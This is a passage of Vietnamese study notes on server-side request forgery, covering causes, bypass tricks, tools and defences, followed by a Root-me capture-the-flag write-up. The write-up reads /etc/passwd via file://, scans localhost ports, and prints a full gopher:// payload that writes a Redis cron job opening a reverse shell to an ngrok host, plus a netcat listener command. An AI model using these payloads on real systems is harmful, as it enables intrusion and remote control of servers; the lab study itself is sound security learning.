```
+ Tìm hiểu về SSRF(Khái niệm, nguyên nhân, tác hại + 1 số cách bypass, cách phòng chống).
+ Giải các bài ssrf trên rootme.
```
# SSRF (Server Side Request Forgery)
## Khái niệm
SSRF là cuộc tấn công yêu cầu giả từ máy chủ cho phép kẻ tấn công thay đổi tham số yêu cầu từ đó có thể kiểm soát được yêu cầu của máy chủ, khi đó kẻ tấn công sẽ khiến máy chủ gửi yêu cầu đến 1 máy chủ khác hoặc chính nó nhằm mục đích xấu.
## Nguyên nhân
- Thiếu kiểm soát đầu vào: Khi máy chủ lấy tài nguyên từ tham số được kiểm soát người dùng mà không có kiểm tra hay xác thực thì kẻ tấn công có thể sử dụng nó để thực hiện yêu cầu.
- Sử dụng máy chủ sử dụng được các protocol không cần thiết (gopher://, dict://,...) và mở 1 số port có thể khai thác(redis, SMB,..)
- Sử dụng IP nội bộ: Khi ứng dụng web cho phép sử dụng IP nội bộ, kẻ tấn công từ đó có thể yêu cầu truy cập mà không cần xác thực
## Tác hại + 1 số cách bypass
### Tác hại
- Kẻ tấn công có thể truy cập vào các dữ liệu nhạy cảm trên máy chủ cũng như trên cục bộ, từ đó ăn cắp thông tin quan trọng của người dùng,...
- Vượt qua các lớp bảo mật, truy cập vào mạng cục bộ từ đó dẫn đến các cuộc tấn công khác nghiêm trọng hơn như RCE,...

### 1 số cách bypass
- Trong cuộc tấn công vào chính máy chủ:
  - Sử dụng IP thay thế `127.0.0.1`, `localhost` như: `2130706433` (dạng số nguyên), `127.0.1`, `127.1`, `017700000001`(dạng octal),...
  - Obfuscating các chuỗi bị filter như URL enconde,...
- Open redirection: Khi ứng dụng web redirect, quan soát các tham số trên URL từ đó có thể kiểm soát được.
- URL parsing: 
  - Sử dụng `@` để đưa phần phía trước thành credential 
  - Sử dụng `#` (fragment) để tạo ra tham số mới mà từ đó máy chủ đọc được và truy cập được nó.

- Encode, double encode,...
- Sử dụng các protocols:
  - `file://`: `file:///etc/passwd`
  - `dict://`:`dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>` => `ssrf.php?url=dict://attacker:11111/`
  - `gopher://`: `gopher://<server>:8080/_GET / HTTP/1.0%0A%0A`
  - ...
- Sử dụng tools:
  - <a href="https://github.com/swisskyrepo/SSRFmap" >SSRFMap</a> (phát hiện và khai thác SSRF)
  - <a href="https://github.com/tarunkant/Gopherus" >Gopherus</a> (tạo payload khai thác MySQL, Redis,...)
 
Tham khảo: <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery" >Hacktricks</a>
## Phòng chống
- Kiểm tra xác thực đầu vào: kiểm tra giới hạn phạm vi tham số được đưa vào URL ví dụ như giới hạn các địa chỉ IP có thể yêu cầu đến máy chủ...
- Sử dụng whitelist: chỉ định các URL hay các protocols, wrapper hợp lệ mà ứng dụng có thể kiểm soát được.
- Giới hạn truy cập máy chủ cục bộ, sử dụng cấu hình máy chủ hợp lý.
- Sử dụng tường lửa, thư viện bảo mật và thường xuyên cập nhật chúng.

# Root-me
## Server Side Request Forgery
Link: https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery

![image](https://user-images.githubusercontent.com/92881216/229118568-98447fe1-187c-47b2-8e71-deb5e1044c88.png)

Nhìn sơ qua thì web có 1 input url:

![image](https://user-images.githubusercontent.com/92881216/229118790-585c2ee8-144d-4c5f-b177-42feabf035b8.png)

Nhập thử với `https://www.google.com/` thì :

![image](https://user-images.githubusercontent.com/92881216/229119047-c4c6829d-33c3-4638-98b9-3e7b38490972.png)

Như vậy có thể web dùng curl để crawl lại web được nhập từ url. Tiếp tục thử với `file:///etc/passwd`:

![image](https://user-images.githubusercontent.com/92881216/229119398-f4062355-78d3-415b-b356-d9c87e3693ea.png)

Như vậy web có vẻ không filter gì, nhưng trong `/etc/passwd` cũng không có gì, tiếp tục thử với `http://localhost`

![image](https://user-images.githubusercontent.com/92881216/229119635-33516819-24a3-4445-9434-936e3f199173.png)

Như vậy nó có thể yêu cầu đến chính server nó. Mặt khác, SSRF có thể khai thác qua các cổng mở khác có thể dấn đến RCE, vì vậy dùng burp suite để test toàn bộ cổng với payload: `http://localhost:x` với x từ 1 -> 65535 và nhận thấy :


Như vậy cổng 6379 được mở, đây là cổng mặc định của `redis`.<br>
> Redis 6379 là cổng mặc định mà Redis nghe các kết nối. Nó là một kho lưu trữ cấu trúc dữ liệu trong bộ nhớ phổ biến được sử dụng làm cơ sở dữ liệu, bộ đệm và trình môi giới tin nhắn. Đây là một cơ sở dữ liệu nhanh, có thể mở rộng và đáng tin cậy được sử dụng bởi nhiều trang web và ứng dụng phổ biến.

Lanh quanh 1 lúc trên mạng tìm được tool <a href="https://github.com/tarunkant/Gopherus" >Gopherus</a>. Đây là tool tạo payload thông qua protocol `gopher` dùng để khai thác các dịch vụ như: mysql, redis, smtp,...

Sau 1 hồi tìm hiểu thì đây là cách khai thác:
- Đầu tiên dùng `ngrok` với command `ngrok tcp 1235` để tạo ra 1 tunel từ máy đến internet qua cổng 1235 (Đây là cổng để netcat nghe reverse shell) : 

![image](https://user-images.githubusercontent.com/92881216/229121608-cecd01ed-8214-4641-be29-06aa60d12811.png)

- Tiếp theo, dùng `Gopherus` tạo payload reverse shell với ip vừa tạo từ `ngrok`:

![image](https://user-images.githubusercontent.com/92881216/229122051-08bdffd2-3422-4427-9d5e-b52b474ca55c.png)

Tuy nhiên mặc định tool tạo ra có cổng 1234 nên cần đổi nó sang cổng đã tạo ở `ngrok` (ở đây là: 16632)

Payload khi đó là:
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2472%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/0.tcp.ap.ngrok.io/16632%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```
- Bây giờ chỉ việc dùng `nc -lvp 1235` rồi gửi payload thôi...

Mặc dù thử rất nhiều lần nhưng em vẫn bị lỗi :

![image](https://user-images.githubusercontent.com/92881216/229124019-26a57794-41a9-4685-8a5b-53ed77b445fe.png)




